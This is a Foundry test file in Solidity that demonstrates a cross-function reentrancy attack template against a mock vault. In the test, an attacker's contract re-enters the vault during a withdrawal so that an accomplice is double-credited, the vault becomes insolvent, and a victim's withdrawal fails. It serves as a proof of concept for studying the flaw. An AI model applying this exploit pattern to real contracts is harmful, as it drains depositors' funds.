// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockCrossVault.sol";
import "../src/attacks/cross_function_reentrancy.sol";

/**
 * @title CrossFunctionReentrancyTest
 * @notice Proves the `cross_function_reentrancy` template: withdrawBalance()
 *         sends ETH before zeroing the balance, so the attacker re-enters
 *         transferBalance() from the receive() hook and double-credits funds.
 */
contract CrossFunctionReentrancyTest is Test {
    MockCrossVault public vault;
    CrossFunctionReentrancyAttack public attackContract;
    address public attack = makeAddr("attack");
    address public benefactor = makeAddr("benefactor");
    address public victim = makeAddr("victim");

    function setUp() public {
        vault = new MockCrossVault();
        attackContract = new CrossFunctionReentrancyAttack(address(vault), benefactor);
    }

    function testCrossFunctionReentrancy() public {
        // victim funds the vault with 2 ETH (backing to steal)
        vm.deal(victim, 2 ether);
        vm.prank(victim);
        vault.deposit{value: 2 ether}();

        // attacker deposits 1 ETH, then triggers the exploit
        vm.deal(attack, 1 ether);
        vm.prank(attack);
        attackContract.attack{value: 1 ether}();

        // attack contract received the withdrawal back (1 ETH)
        assertEq(address(attackContract).balance, 1 ether, "withdrawal received");
        // benefactor now holds a double-credited 1 ETH vault balance
        assertEq(vault.balanceOf(benefactor), 1 ether, "benefactor credited");

        // claims (victim 2 + benefactor 1 = 3) exceed deposits (2) -> insolvent
        uint256 totalClaims = vault.balanceOf(victim) + vault.balanceOf(benefactor);
        assertGt(totalClaims, vault.totalDeposits(), "claims exceed deposits");

        // benefactor realizes the stolen credit
        vm.prank(benefactor);
        vault.withdrawBalance();
        assertEq(benefactor.balance, 1 ether, "benefactor realized funds");
        assertEq(address(vault).balance, 1 ether, "vault nearly drained");

        // victim can no longer be paid in full — the vault reverts
        vm.expectRevert(bytes("transfer failed"));
        vm.prank(victim);
        vault.withdrawBalance();
    }
}
